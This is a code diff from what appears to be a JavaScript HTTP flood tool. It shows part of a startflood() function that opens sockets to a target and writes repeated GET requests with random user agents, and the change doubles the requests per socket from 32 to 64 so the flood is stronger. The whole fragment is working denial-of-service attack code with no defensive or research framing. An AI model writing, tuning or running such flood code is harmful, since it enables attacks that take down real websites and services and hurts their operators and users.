@@ -94,7 +94,7 @@ function startflood() {
         var s = require('net').Socket();
         s.connect(port, host);
         s.setTimeout(10000);
-        for (var i = 0; i < 32; i++) {
+        for (var i = 0; i < 64; i++) {
             s.write('GET ' + formattedTarget + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
         }
         s.on('data', function () {
